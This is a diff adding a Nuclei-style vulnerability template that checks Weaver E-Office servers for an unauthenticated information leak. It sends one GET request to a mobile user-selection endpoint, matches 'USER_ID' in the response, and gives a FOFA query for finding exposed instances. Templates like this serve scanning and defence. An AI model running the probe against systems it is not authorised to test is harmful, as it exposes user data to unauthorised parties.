@@ -1,0 +1,32 @@
+id: EOffice-infoleak
+
+info:
+  name: EOffice-infoleak
+  author: qysgl
+  severity: high
+  description: EOffice信息泄露
+  reference:
+  - https://mp.weixin.qq.com/s/Aj1Qb1X5KzE79ZTB1HUJkw
+  tags: h3c,infoleak
+  metadata:
+    fofa-qeury: app="泛微-EOffice"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        GET /e-mobile/app/common/userselectNew/do.php HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0
+               
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "USER_ID"
+        part: body
